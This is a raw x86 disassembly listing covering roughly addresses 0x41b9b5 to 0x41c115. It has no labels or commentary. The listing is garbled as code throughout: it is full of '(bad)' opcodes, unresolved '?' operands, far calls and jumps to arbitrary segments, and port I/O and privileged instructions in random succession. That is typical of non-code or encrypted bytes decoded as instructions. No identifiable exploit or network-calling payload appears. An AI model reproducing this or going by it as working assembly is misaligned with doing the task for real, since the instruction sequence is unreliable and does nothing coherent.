  41b9b5:	ret    
  41b9b6:	das    
  41b9b7:	push   0x736f6b43
  41b9bc:	shr    BYTE PTR [edx-0xded5a3],1
  41b9c2:	je     0x41b970
  41b9c4:	(bad)
  41b9c7:	pop    es
  41b9c8:	stc    
  41b9c9:	mov    edi,0x9c446c0
  41b9ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b9cf:	arpl   bx,di
  41b9d1:	pop    esp
  41b9d2:	outs   dx,DWORD PTR ds:[esi]
  41b9d3:	inc    ebx
  41b9d4:	enter  0x2ee1,0x16
  41b9d8:	fidivr DWORD PTR [esi+0xa]
  41b9db:	mov    edi,edi
  41b9dd:	test   BYTE PTR [eax-0x3755e7da],bh
  41b9e3:	xor    BYTE PTR [ecx],cl
  41b9e5:	inc    ebp
  41b9e6:	repz arpl WORD PTR [ebx],bx
  41b9e9:	aas    
  41b9ea:	sar    dl,1
  41b9ec:	mov    ch,BYTE PTR [esi-0x32]
  41b9ef:	mov    ebp,0xddfb4ec2
  41b9f4:	es ss js 0x41ba15
  41b9f8:	inc    ecx
  41b9f9:	cmp    cl,BYTE PTR [ebp+0x68]
  41b9fc:	add    al,ch
  41b9fe:	push   ebx
  41b9ff:	aas    
  41ba00:	imul   esp,DWORD PTR [ecx+0xa0b7dfb],0x63
  41ba07:	call   0xd49e:0x684db350
  41ba0e:	add    al,0xa0
  41ba10:	and    dh,BYTE PTR [eax-0x4adaa31a]
  41ba16:	retf   0xb41a
  41ba19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba1a:	sub    al,0x8f
  41ba1c:	loop   0x41ba7a
  41ba1e:	in     eax,0x7a
  41ba20:	pop    edx
  41ba21:	shl    bl,0xc7
  41ba24:	rcr    DWORD PTR [edx+0x44918e00],cl
  41ba2a:	cwde   
  41ba2b:	jl     0x41b9ed
  41ba2d:	(bad)  
  41ba2e:	cwde   
  41ba2f:	das    
  41ba30:	sub    DWORD PTR [eax+0x46bf48ff],ecx
  41ba36:	jno    0x41ba4d
  41ba38:	add    al,0x46
  41ba3a:	mov    eax,ds:0x68f362be
  41ba3f:	inc    esi
  41ba40:	inc    esp
  41ba41:	lds    eax,FWORD PTR [esi+0x6354daee]
  41ba47:	xchg   edi,eax
  41ba48:	fcmovne st,st(0)
  41ba4a:	jmp    0x41ba0e
  41ba4c:	loope  0x41b9dc
  41ba4e:	adc    DWORD PTR [ecx-0x66],ecx
  41ba51:	lea    esi,[ecx]
  41ba53:	cdq    
  41ba54:	imul   ecx,edx,0x23e41372
  41ba5a:	ret    
  41ba5b:	cmp    DWORD PTR [ebp+0x54379c33],esi
  41ba61:	int    0x34
  41ba63:	jno    0x41baca
  41ba65:	mov    esi,esp
  41ba67:	test   DWORD PTR [ebx+0x3d],0x2413bed
  41ba6e:	std    
  41ba6f:	mov    ebx,0xf4d22f1b
  41ba74:	call   0xb4332c65
  41ba79:	cmp    dh,bh
  41ba7b:	mov    esp,DWORD PTR [eax]
  41ba7d:	push   edx
  41ba7e:	mov    bh,0x58
  41ba80:	repnz dec edi
  41ba82:	or     BYTE PTR [edi+0x46f95c13],dh
  41ba88:	cmp    dl,0xe5
  41ba8b:	jbe    0x41bb00
  41ba8d:	int3   
  41ba8e:	aas    
  41ba8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ba90:	repnz rcl DWORD PTR [eax+0x37cfcd],1
  41ba97:	jmp    0xc0f0c7a5
  41ba9c:	cmc    
  41ba9d:	xchg   BYTE PTR [edx-0x7e],dh
  41baa0:	test   DWORD PTR [edi+0x15],ebx
  41baa3:	test   DWORD PTR ss:[ebx],ebp
  41baa6:	repnz (bad) 
  41baa8:	sbb    DWORD PTR [eax+0x6be0773e],esi
  41baae:	lock lods al,BYTE PTR ds:[esi]
  41bab0:	push   edi
  41bab1:	call   0x761dd38c
  41bab6:	xor    eax,0xd3eea385
  41babb:	js     0x41baec
  41babd:	sbb    dh,ah
  41babf:	and    esp,ecx
  41bac1:	(bad)  
  41bac2:	stos   DWORD PTR es:[edi],eax
  41bac3:	pop    eax
  41bac4:	shl    ebp,cl
  41bac6:	stos   BYTE PTR es:[edi],al
  41bac7:	pop    DWORD PTR fs:[bp+si+0x30]
  41bacc:	add    al,0xa2
  41bace:	inc    ecx
  41bacf:	cwde   
  41bad0:	mov    WORD PTR [edx],?
  41bad2:	out    dx,al
  41bad3:	push   es
  41bad4:	and    esi,DWORD PTR [edi+0x388bc621]
  41bada:	nop
  41badb:	inc    ebx
  41badc:	xchg   ebp,eax
  41badd:	sub    bl,bh
  41badf:	fidiv  WORD PTR [eax-0x27]
  41bae2:	sub    al,0x6c
  41bae4:	loope  0x41bb52
  41bae6:	push   esp
  41bae7:	rol    ch,0x3e
  41baea:	cmp    BYTE PTR [eax-0x6d],dh
  41baed:	cmp    bl,BYTE PTR [ebx+0x3]
  41baf0:	and    BYTE PTR [edx+ebx*1],ah
  41baf3:	jl     0x41bb00
  41baf5:	ins    DWORD PTR es:[edi],dx
  41baf6:	lea    ebp,[ecx-0x78cfad24]
  41bafc:	ret    
  41bafd:	js     0x41baad
  41baff:	mov    cl,0x6a
  41bb01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb02:	xchg   ebx,eax
  41bb03:	xor    esp,DWORD PTR [esi+edx*2-0x9845ba6]
  41bb0a:	aaa    
  41bb0b:	pop    ebx
  41bb0c:	push   esp
  41bb0d:	ds fcmovne st,st(2)
  41bb10:	or     ah,BYTE PTR [ebp-0x66f09a4d]
  41bb16:	jp     0x41bacc
  41bb18:	test   esi,esi
  41bb1a:	(bad)  
  41bb1b:	pop    eax
  41bb1c:	push   0xffffffd9
  41bb1e:	mov    ch,al
  41bb20:	mov    edx,0xb593fb3c
  41bb25:	(bad)  
  41bb26:	outs   dx,BYTE PTR ds:[esi]
  41bb27:	jb     0x41baab
  41bb29:	cmp    BYTE PTR [ebx+0x1e],0x18
  41bb2d:	mov    edx,0x59bb59bc
  41bb32:	ins    BYTE PTR es:[edi],dx
  41bb33:	mov    ds:0xa07877bf,eax
  41bb38:	mov    ecx,0x2d891931
  41bb3d:	out    0xa7,al
  41bb3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb40:	fwait
  41bb41:	sbb    DWORD PTR [esi],0x3d
  41bb44:	scas   al,BYTE PTR es:[edi]
  41bb45:	inc    edx
  41bb46:	mov    ss,WORD PTR [ecx+0x19]
  41bb49:	jne    0x41bb6b
  41bb4b:	cs xchg ebx,eax
  41bb4d:	call   0x8319:0x9dddd593
  41bb54:	imul   esp,DWORD PTR [edi],0xffffffaa
  41bb57:	mov    BYTE PTR [eax],dl
  41bb59:	cld    
  41bb5a:	lahf   
  41bb5b:	adc    DWORD PTR [ebx+0x58a7a3a3],esp
  41bb61:	hlt    
  41bb62:	icebp  
  41bb63:	mov    eax,0xce9c7c18
  41bb68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb69:	mov    dh,0xf6
  41bb6b:	jo     0x41bba7
  41bb6d:	idiv   BYTE PTR [ebx+0x59]
  41bb70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb71:	and    eax,0x15391694
  41bb76:	das    
  41bb77:	push   esi
  41bb78:	icebp  
  41bb79:	adc    al,0x86
  41bb7b:	jmp    0x41bb23
  41bb7d:	(bad)  
  41bb7e:	jl     0x1633fc43
  41bb84:	(bad)  
  41bb86:	xchg   esi,eax
  41bb87:	aam    0x83
  41bb89:	xor    esi,0x4537c419
  41bb8f:	cmp    al,0xdd
  41bb91:	mov    bl,0x9a
  41bb93:	inc    eax
  41bb94:	mov    esp,DWORD PTR ds:0xfe7ff917
  41bb9a:	add    cl,BYTE PTR [eax]
  41bb9c:	mov    esp,0x1a13ea7c
  41bba1:	pop    edx
  41bba2:	dec    eax
  41bba3:	jmp    0xd529:0xce0605b4
  41bbaa:	mov    ch,0x22
  41bbac:	ss lock push 0xffffffff
  41bbb0:	js     0x41bbd2
  41bbb2:	out    0x2,eax
  41bbb4:	sub    al,0x92
  41bbb6:	xor    ah,bh
  41bbb8:	aaa    
  41bbb9:	mul    edx
  41bbbb:	retf   0x35b9
  41bbbe:	adc    BYTE PTR [esi],ch
  41bbc0:	imul   esi,DWORD PTR [ecx],0xfffffffa
  41bbc3:	sub    eax,0x104e004a
  41bbc8:	pusha  
  41bbc9:	dec    edx
  41bbca:	bound  ebp,QWORD PTR [eax+0x7b]
  41bbcd:	and    DWORD PTR [edx+0x1fb1c6b6],eax
  41bbd3:	mov    eax,0xaccd0f8
  41bbd8:	add    ebp,ebp
  41bbda:	mov    cl,0xc
  41bbdc:	mov    WORD PTR [ebx+0x63030c9e],ss
  41bbe2:	pop    es
  41bbe3:	addr16 pop ebx
  41bbe5:	push   edi
  41bbe6:	int3   
  41bbe7:	or     ebp,DWORD PTR [edi+0x6e]
  41bbea:	fs jbe 0x41bbdc
  41bbed:	dec    esp
  41bbee:	dec    ecx
  41bbef:	inc    edi
  41bbf0:	ror    BYTE PTR [eax+eiz*2],1
  41bbf3:	xchg   DWORD PTR fs:[ecx],ebp
  41bbf6:	inc    edx
  41bbf7:	inc    edi
  41bbf8:	mov    bl,0x11
  41bbfa:	mov    ebp,0x6a3789e1
  41bbff:	push   edx
  41bc00:	mov    edx,0xa47d8460
  41bc05:	push   0x38ab13eb
  41bc0a:	mov    BYTE PTR [esi+0x6],al
  41bc0d:	repz dec ebx
  41bc0f:	sbb    dh,BYTE PTR [esi+ebp*4-0xa3ad6d]
  41bc16:	jg     0x41bc5c
  41bc18:	mov    edi,0x4a70c8b
  41bc1d:	push   ebx
  41bc1e:	push   edx
  41bc1f:	pop    esi
  41bc20:	cmp    eax,0x88a796a1
  41bc25:	repnz mov eax,0x862a4dc3
  41bc2b:	add    eax,0xe7c46b07
  41bc30:	pop    ebp
  41bc31:	popa   
  41bc32:	mov    bl,0xdb
  41bc34:	sbb    esi,DWORD PTR [eax-0x22ef0b3]
  41bc3a:	mov    ds:0xa9b338ee,al
  41bc3f:	xchg   ecx,eax
  41bc40:	cwde   
  41bc41:	mov    ebx,0xd7fad5f8
  41bc46:	sub    BYTE PTR [edi],al
  41bc48:	pop    es
  41bc49:	mov    edi,0xeaff7aa8
  41bc4e:	lods   eax,DWORD PTR ds:[esi]
  41bc4f:	pop    eax
  41bc50:	and    al,0x73
  41bc53:	enterw 0x232a,0xf1
  41bc58:	cmp    DWORD PTR [esi],esi
  41bc5a:	pop    edi
  41bc5b:	jbe    0x41bcd2
  41bc5d:	mov    ch,0xa7
  41bc5f:	test   eax,0xe48bc6c5
  41bc64:	out    0xc3,al
  41bc66:	jp     0x41bc34
  41bc68:	fisub  DWORD PTR [edx+0x5c2301c0]
  41bc6e:	sbb    ecx,DWORD PTR [ecx+0x21]
  41bc71:	lock add al,BYTE PTR [eax+edi*4+0x2f]
  41bc76:	nop
  41bc77:	sub    esp,DWORD PTR [edi+ebp*4]
  41bc7a:	std    
  41bc7b:	sahf   
  41bc7c:	repz fmul st(5),st
  41bc7f:	or     DWORD PTR [ebp-0x2c76a5d],eax
  41bc85:	sar    DWORD PTR [esi],0xd7
  41bc88:	sub    BYTE PTR [esi+ebp*4],0xff
  41bc8c:	pop    esp
  41bc8d:	adc    eax,0x39f377d9
  41bc92:	pop    eax
  41bc93:	pop    ebx
  41bc94:	adc    eax,DWORD PTR [ebp-0x6b]
  41bc97:	(bad)  
  41bc98:	shr    ah,cl
  41bc9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bc9b:	push   ss
  41bc9c:	jns    0x41bceb
  41bc9e:	sub    BYTE PTR [eax+0x9],0x36
  41bca2:	out    dx,eax
  41bca3:	cld    
  41bca4:	lea    esp,[esi+0x5d1f68e6]
  41bcaa:	cld    
  41bcab:	jg     0x41bc68
  41bcad:	xor    ebp,edi
  41bcaf:	pusha  
  41bcb0:	cmp    al,0x96
  41bcb2:	cwde   
  41bcb3:	test   al,0xfa
  41bcb5:	cs and esp,edi
  41bcb8:	ret    0x4305
  41bcbb:	inc    eax
  41bcbc:	out    0x69,al
  41bcbe:	aad    0x5e
  41bcc0:	in     al,dx
  41bcc1:	ret    
  41bcc2:	mov    al,BYTE PTR [esi-0x6222a23a]
  41bcc8:	mov    esi,0x3f1dc510
  41bccd:	retf   
  41bcce:	aaa    
  41bccf:	in     al,dx
  41bcd0:	jle    0x41bc58
  41bcd2:	cli    
  41bcd3:	dec    ebx
  41bcd4:	mov    esi,0x4768c35c
  41bcd9:	sbb    BYTE PTR [ecx+0x5d],bl
  41bcdc:	loope  0x41bc63
  41bcde:	sbb    BYTE PTR [ecx+eax*2-0xa],bl
  41bce2:	loope  0x41bd43
  41bce4:	les    ebp,FWORD PTR [ebp-0x16]
  41bce7:	mov    ecx,0xf2ffe27f
  41bcec:	sbb    ebp,eax
  41bcee:	mov    esi,0x9dea6d96
  41bcf3:	hlt    
  41bcf4:	add    al,BYTE PTR [esi]
  41bcf6:	and    eax,0xadd22459
  41bcfb:	stc    
  41bcfc:	pop    ebx
  41bcfd:	test   al,0xc9
  41bcff:	sbb    esp,DWORD PTR ds:0x73357cf9
  41bd05:	push   0x62
  41bd07:	mov    ds:0x63bb2d1e,al
  41bd0c:	push   ss
  41bd0d:	sbb    eax,0xcd62f2cc
  41bd12:	inc    esi
  41bd13:	loope  0x41bd3b
  41bd15:	add    al,BYTE PTR [ebx+edx*2]
  41bd18:	test   BYTE PTR [eax-0x7ccc4d98],ah
  41bd1e:	fptan  
  41bd20:	js     0x41bd77
  41bd22:	xchg   dl,ah
  41bd24:	mov    ecx,0x768116d5
  41bd29:	xor    BYTE PTR [edi-0x61],dh
  41bd2c:	add    al,0x7e
  41bd2e:	dec    eax
  41bd2f:	je     0x41bce0
  41bd31:	add    DWORD PTR [ecx-0x47],ebx
  41bd34:	in     eax,0xd9
  41bd36:	fild   WORD PTR ds:0x2fd117cd
  41bd3c:	sbb    DWORD PTR [esi+ebx*4+0xf],ebp
  41bd40:	into   
  41bd41:	out    0x41,eax
  41bd43:	push   es
  41bd44:	std    
  41bd45:	es (bad) 
  41bd47:	cmp    ebp,eax
  41bd49:	sbb    ah,BYTE PTR [edx+0x26274d5]
  41bd4f:	shl    DWORD PTR [edx+0x514878ac],cl
  41bd55:	aas    
  41bd56:	mov    WORD PTR [esi+ecx*2],ds
  41bd59:	jge    0x41bd3c
  41bd5b:	fdivr  QWORD PTR [ecx]
  41bd5d:	inc    ebx
  41bd5e:	push   edi
  41bd5f:	cli    
  41bd60:	push   eax
  41bd61:	mov    edi,0x42c4a94e
  41bd66:	pop    ebx
  41bd67:	in     eax,0xa2
  41bd69:	sub    ecx,DWORD PTR [eax+0x177c390c]
  41bd6f:	inc    eax
  41bd70:	mov    edx,0xd66daf57
  41bd75:	jg     0x41bdc7
  41bd77:	shr    DWORD PTR [esi+0x68cded0c],0x26
  41bd7e:	lahf   
  41bd7f:	xlat   BYTE PTR ds:[ebx]
  41bd80:	sbb    al,0xf4
  41bd82:	jo     0x41bd2a
  41bd84:	dec    esp
  41bd85:	sub    ebx,0x9
  41bd88:	test   al,0x37
  41bd8a:	adc    ecx,DWORD PTR [edx+0x6d]
  41bd8d:	je     0x41bd0f
  41bd8f:	push   esi
  41bd90:	cli    
  41bd91:	sti    
  41bd92:	inc    edx
  41bd93:	sub    eax,0x41a2e5ed
  41bd98:	pop    eax
  41bd99:	test   ebx,0x86f76d9
  41bd9f:	nop
  41bda0:	lock jbe 0x41bdae
  41bda3:	mov    ch,0xa5
  41bda5:	add    ecx,DWORD PTR [edx+0x43]
  41bda8:	push   edx
  41bda9:	aas    
  41bdaa:	pop    es
  41bdab:	ins    DWORD PTR es:[edi],dx
  41bdac:	xchg   edx,eax
  41bdad:	lods   eax,DWORD PTR ds:[esi]
  41bdae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bdaf:	push   0xffffffa6
  41bdb1:	mov    cl,0xac
  41bdb3:	and    BYTE PTR [eax],dl
  41bdb5:	(bad)  
  41bdb6:	cmp    BYTE PTR [edi-0x41],bh
  41bdb9:	xchg   ebx,eax
  41bdba:	push   eax
  41bdbb:	aad    0x4f
  41bdbd:	pop    es
  41bdbe:	ss mov eax,ss
  41bdc1:	lea    esi,[ebp+0x1ee18444]
  41bdc7:	mov    al,ds:0xc98d6452
  41bdcc:	inc    edi
  41bdcd:	mov    al,fs:0x795f96c1
  41bdd3:	jl     0x41be3a
  41bdd5:	pop    esi
  41bdd6:	add    ch,bh
  41bdd8:	lds    ebp,FWORD PTR [bx+si+0x57]
  41bddc:	(bad)  
  41bddd:	fidiv  DWORD PTR [edi]
  41bddf:	aaa    
  41bde0:	enter  0x2571,0xca
  41bde4:	or     BYTE PTR [eax+ecx*8],ah
  41bde7:	es setns dh
  41bdeb:	ins    BYTE PTR es:[edi],dx
  41bdec:	leave  
  41bded:	xor    esi,DWORD PTR [eax]
  41bdef:	pushf  
  41bdf0:	cmp    ebx,eax
  41bdf2:	xor    BYTE PTR [ebp+0x10],dh
  41bdf5:	mov    al,0x6d
  41bdf7:	cmp    eax,0x1ffa4661
  41bdfc:	iret   
  41bdfd:	mov    esp,0xbcae5069
  41be02:	cmp    eax,0x637b98ec
  41be07:	xchg   edi,eax
  41be08:	jno    0x41bda9
  41be0a:	jp     0x41be1f
  41be0c:	cmp    al,0x38
  41be0e:	clc    
  41be0f:	addr16 mov ds:0x5d6c,al
  41be13:	mov    WORD PTR [edx-0x31f95345],gs
  41be19:	retf   0xd4f5
  41be1c:	add    eax,0xfb43d6a2
  41be21:	inc    esi
  41be22:	rcl    DWORD PTR [esp+ebx*1+0x5e5001bb],1
  41be29:	out    dx,al
  41be2a:	out    0x58,al
  41be2c:	pop    ss
  41be2d:	sahf   
  41be2e:	xor    DWORD PTR [ecx-0x3006001],ecx
  41be34:	rol    esi,0xab
  41be37:	xchg   al,bl
  41be39:	rol    BYTE PTR [ecx],1
  41be3b:	into   
  41be3c:	test   dl,dl
  41be3e:	xchg   edx,eax
  41be3f:	inc    edi
  41be40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41be41:	dec    ebx
  41be42:	loop   0x41bea1
  41be44:	cmp    edi,eax
  41be46:	imul   eax,eax,0xdbb3b2
  41be4c:	jmp    DWORD PTR [esi+eax*4-0x66bc5749]
  41be53:	repnz add ebx,ecx
  41be56:	mov    eax,0x4aaf1453
  41be5b:	cmp    ebx,DWORD PTR [edi-0x1e]
  41be5e:	scas   al,BYTE PTR es:[edi]
  41be5f:	loope  0x41bec2
  41be61:	add    al,0xe7
  41be63:	repnz mov esp,0x1567c990
  41be69:	jb     0x41be8f
  41be6b:	iret   
  41be6c:	das    
  41be6d:	fild   DWORD PTR ds:[edx]
  41be70:	sar    ch,0x8d
  41be73:	mov    ch,0xaa
  41be75:	je     0x41be30
  41be77:	cwde   
  41be78:	jne    0x41be2f
  41be7a:	add    al,0x98
  41be7c:	inc    esi
  41be7d:	out    0x59,eax
  41be7f:	inc    edx
  41be80:	imul   eax,DWORD PTR [edi+0x764e2f25],0xffffffc0
  41be87:	xor    bl,ah
  41be89:	push   ebp
  41be8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41be8b:	fadd   QWORD PTR [esi]
  41be8d:	mov    cl,bh
  41be8f:	jns    0x41be98
  41be91:	jmp    0x41be6c
  41be93:	inc    ecx
  41be94:	dec    ebp
  41be95:	and    eax,ebx
  41be97:	(bad)  
  41be98:	fld    QWORD PTR [esi+eiz*2-0x45]
  41be9c:	add    cl,dh
  41be9e:	loope  0x41becf
  41bea0:	dec    esp
  41bea1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bea2:	dec    eax
  41bea3:	fdiv   st(6),st
  41bea5:	adc    dl,BYTE PTR [edi]
  41bea7:	stc    
  41bea8:	and    DWORD PTR [edx+0x5a],eax
  41beab:	or     al,0xe2
  41bead:	cli    
  41beae:	fwait
  41beaf:	sub    eax,0x367d2449
  41beb4:	retf   0xf3c3
  41beb7:	inc    ebp
  41beb8:	xor    bl,BYTE PTR gs:[ecx+edi*8+0x5f]
  41bebd:	push   ss
  41bebe:	loope  0x41beac
  41bec0:	mov    WORD PTR [edx-0x1f],ss
  41bec3:	jnp    0x41bebf
  41bec5:	dec    ecx
  41bec6:	fisttp QWORD PTR [edx]
  41bec8:	call   0x7987:0x790c3479
  41becf:	pop    ebp
  41bed0:	outs   dx,DWORD PTR ds:[esi]
  41bed1:	push   es
  41bed2:	leave  
  41bed3:	fsub   DWORD PTR [edx]
  41bed5:	mov    ch,cl
  41bed7:	push   ecx
  41bed8:	add    edi,edi
  41beda:	pop    ds
  41bedb:	scas   eax,DWORD PTR es:[edi]
  41bedc:	popa   
  41bedd:	push   esi
  41bede:	ret    0xbd55
  41bee1:	mov    ds:0xe0e917eb,al
  41bee6:	xchg   edi,eax
  41bee7:	or     BYTE PTR [edi],dl
  41bee9:	gs jb  0x41beaf
  41beec:	mov    edi,0xfbe907c
  41bef1:	test   eax,0x520e8597
  41bef6:	and    DWORD PTR [edx-0x3bd3d2c1],ebp
  41befc:	mov    cs,edi
  41befe:	dec    edx
  41beff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf00:	mov    ah,0x47
  41bf02:	xchg   esp,eax
  41bf03:	pop    ss
  41bf04:	dec    eax
  41bf05:	fsubr  st(7),st
  41bf07:	retf   0x58a7
  41bf0a:	pop    ecx
  41bf0b:	or     al,0xc6
  41bf0d:	mov    cl,al
  41bf0f:	jb     0x41bf14
  41bf11:	push   edi
  41bf12:	fs cmp ebp,0xffffff86
  41bf16:	add    edx,DWORD PTR [ebp+0x6f]
  41bf19:	xchg   BYTE PTR ss:0x3bb96674,cl
  41bf20:	mov    edi,0x15949e2e
  41bf25:	sbb    al,0x89
  41bf27:	xchg   edi,eax
  41bf28:	xchg   esp,eax
  41bf29:	test   DWORD PTR ds:0x6916bf89,esp
  41bf2f:	and    ch,BYTE PTR [edx]
  41bf31:	mov    esp,0x20d24782
  41bf36:	(bad)  
  41bf38:	sub    al,cl
  41bf3a:	retf   0x937b
  41bf3d:	aas    
  41bf3e:	xchg   edi,eax
  41bf3f:	and    bh,0x27
  41bf42:	jmp    0x41bfa3
  41bf44:	fdivr  st(6),st
  41bf46:	push   eax
  41bf47:	mov    dh,0x61
  41bf49:	pop    ebp
  41bf4a:	pop    eax
  41bf4b:	mov    esp,cs
  41bf4d:	adc    eax,0x4b6b815e
  41bf52:	(bad)  
  41bf53:	retf   
  41bf54:	or     esi,DWORD PTR [edi-0x4ee50a4a]
  41bf5a:	mov    dh,0xce
  41bf5c:	pop    edi
  41bf5d:	(bad)  
  41bf5e:	sub    al,0xef
  41bf60:	cwde   
  41bf61:	popa   
  41bf62:	adc    al,0xe2
  41bf64:	add    ch,bh
  41bf66:	dec    eax
  41bf67:	fisubr DWORD PTR [ebx-0x9]
  41bf6a:	or     BYTE PTR [edx],bl
  41bf6c:	mov    DWORD PTR [ebx-0x7f2a2d40],edi
  41bf72:	mov    edx,0x94eca59d
  41bf77:	mov    edx,0x4bed5d88
  41bf7c:	adc    eax,DWORD PTR [ecx-0x5f]
  41bf7f:	loop   0x41bf69
  41bf81:	aas    
  41bf82:	xchg   edi,eax
  41bf83:	pop    ds
  41bf84:	jbe    0x41bfe5
  41bf86:	push   edi
  41bf87:	retf   0xdbf8
  41bf8a:	test   DWORD PTR [ebp-0x48],edx
  41bf8d:	shl    edx,cl
  41bf8f:	(bad)  
  41bf91:	stos   DWORD PTR es:[edi],eax
  41bf92:	mov    ebx,ecx
  41bf94:	xor    BYTE PTR [edx+edi*4-0x2d],dl
  41bf98:	jb     0x41bf41
  41bf9a:	(bad)  
  41bf9c:	and    BYTE PTR [ebp+0x66],cl
  41bf9f:	or     DWORD PTR [ebp-0x1f6c1e70],edi
  41bfa5:	cmp    cl,BYTE PTR [esi-0x48]
  41bfa8:	pop    ss
  41bfa9:	gs ins DWORD PTR es:[edi],dx
  41bfab:	xor    BYTE PTR [esi+esi*1],ah
  41bfae:	aaa    
  41bfaf:	cs in  eax,0xd0
  41bfb2:	ins    DWORD PTR es:[edi],dx
  41bfb3:	scas   al,BYTE PTR es:[edi]
  41bfb4:	bnd call DWORD PTR [ecx-0x2]
  41bfb8:	imul   edi,DWORD PTR [ecx+0x39],0xfffffffd
  41bfbc:	bound  ecx,QWORD PTR [edx+0x3bf1d257]
  41bfc2:	leave  
  41bfc3:	dec    edi
  41bfc4:	daa    
  41bfc5:	adc    ah,dl
  41bfc7:	add    ecx,DWORD PTR [edi+0x45b54987]
  41bfcd:	push   esp
  41bfce:	loop   0x41bfe3
  41bfd0:	ffree  st(2)
  41bfd2:	repnz inc ecx
  41bfd4:	jp     0x41bf68
  41bfd6:	jle    0x41c04a
  41bfd8:	fiadd  DWORD PTR ss:[ebx]
  41bfdb:	fstp   st(3)
  41bfdd:	pop    ebx
  41bfde:	repnz fcom QWORD PTR [ecx+0xc]
  41bfe2:	cmp    edx,0xbb8ed9f2
  41bfe8:	cmp    BYTE PTR [ebx],bl
  41bfea:	in     eax,dx
  41bfeb:	xchg   esi,eax
  41bfec:	jae    0x41bfb3
  41bfee:	mov    cl,0x11
  41bff0:	shl    DWORD PTR [edi+0xd],cl
  41bff3:	inc    edi
  41bff4:	scas   eax,DWORD PTR es:[edi]
  41bff5:	ds dec eax
  41bff7:	xchg   ebx,eax
  41bff8:	pusha  
  41bff9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bffb:	xchg   esp,eax
  41bffc:	popf   
  41bffd:	div    DWORD PTR ds:0x45e3191f
  41c003:	popa   
  41c004:	aaa    
  41c005:	shl    cl,1
  41c007:	pop    edi
  41c008:	mov    BYTE PTR [edi-0x38],ah
  41c00b:	adc    BYTE PTR [ebp+0x1d015f59],bl
  41c011:	adc    al,BYTE PTR [ecx-0x69da6b2d]
  41c017:	mov    esp,0x544aa122
  41c01c:	jo     0x41c007
  41c01e:	aaa    
  41c01f:	xchg   ebx,eax
  41c020:	mov    ds,WORD PTR [ebp+0x1109597f]
  41c026:	pop    eax
  41c027:	xor    al,0x8a
  41c029:	out    0x7d,eax
  41c02b:	pop    edi
  41c02c:	adc    ah,BYTE PTR [edx+0x7bbcf4eb]
  41c032:	addr16 aas 
  41c034:	mov    bh,0x10
  41c036:	ja     0x41c0af
  41c038:	sbb    eax,0x5fd9a053
  41c03d:	mov    DWORD PTR [eax],eax
  41c03f:	push   edi
  41c040:	fs push es
  41c042:	inc    ebp
  41c043:	(bad)  
  41c045:	jge    0x41c00e
  41c047:	rol    BYTE PTR [eax],0xcc
  41c04a:	adc    BYTE PTR [ebx+edx*2+0x5],cl
  41c04e:	pop    es
  41c04f:	pop    edx
  41c050:	repz popa 
  41c052:	jbe    0x41c03a
  41c054:	push   es
  41c055:	cmp    BYTE PTR [esi-0x3a],bl
  41c058:	in     al,0xcb
  41c05a:	mov    ah,0x89
  41c05c:	mov    DWORD PTR [eax+0xa],eax
  41c05f:	xchg   ebp,eax
  41c060:	mov    ebx,0xa205e603
  41c065:	mov    esi,0xa935c821
  41c06a:	test   al,0x7e
  41c06c:	inc    edx
  41c06d:	sar    BYTE PTR [ecx],1
  41c06f:	arpl   WORD PTR [eax+0x11],cx
  41c072:	popf   
  41c073:	stc    
  41c074:	and    eax,0xaac46117
  41c079:	jp     0x41c038
  41c07b:	cmp    DWORD PTR [eax+eiz*4],edi
  41c07e:	cmp    edx,DWORD PTR [eax-0x2d4882c5]
  41c084:	sub    al,0xff
  41c086:	mov    ?,WORD PTR [edi-0x4d66e878]
  41c08c:	jb     0x41c090
  41c08e:	ins    DWORD PTR es:[edi],dx
  41c08f:	mov    ah,0xe9
  41c091:	jmp    0xa956:0x933c998b
  41c098:	xchg   esi,eax
  41c099:	sti    
  41c09a:	imul   esp,edx,0xffffff98
  41c09d:	add    eax,0x305d1ee6
  41c0a2:	cmp    eax,0x8ff28e2b
  41c0a7:	shr    BYTE PTR [edi-0x6f467986],cl
  41c0ad:	(bad)  
  41c0ae:	loop   0x41c129
  41c0b0:	neg    DWORD PTR [bp+si]
  41c0b3:	ffreep st(5)
  41c0b5:	and    al,dl
  41c0b7:	and    eax,0x8e493713
  41c0bc:	mov    ds:0xa4452338,eax
  41c0c1:	lahf   
  41c0c2:	or     DWORD PTR [ecx+esi*4],edx
  41c0c5:	test   DWORD PTR [edi-0x3a6c6648],edx
  41c0cb:	lods   eax,DWORD PTR ds:[esi]
  41c0cc:	push   edx
  41c0cd:	dec    esp
  41c0ce:	push   0x48e44784
  41c0d3:	pop    eax
  41c0d4:	sub    BYTE PTR [eax+esi*2+0x2f],0xd5
  41c0d9:	fstp   TBYTE PTR [ebp+0x22]
  41c0dc:	push   cs
  41c0dd:	in     eax,dx
  41c0de:	call   0x842b:0xfbb1c595
  41c0e5:	inc    edi
  41c0e6:	popa   
  41c0e7:	xor    DWORD PTR [ebx+ebp*8+0x72],esi
  41c0eb:	adc    eax,0xb2b1ce73
  41c0f0:	dec    edi
  41c0f1:	scas   al,BYTE PTR es:[edi]
  41c0f2:	pop    eax
  41c0f3:	sbb    dl,BYTE PTR ss:[ebx-0x18]
  41c0f7:	add    DWORD PTR [esi],0x5c27bb90
  41c0fd:	mov    edx,0xebbaca76
  41c102:	stc    
  41c103:	add    al,0x2
  41c105:	cmp    BYTE PTR [eax+ebx*8-0x31],al
  41c109:	and    ebx,esp
  41c10b:	fdivr  DWORD PTR [eax-0x1d]
  41c10e:	les    esi,FWORD PTR [ebx]
  41c110:	sub    BYTE PTR [esp+edi*8+0x54],al
  41c114:	pop    ds
  41c115:	mov    ds:0xf353b739,al
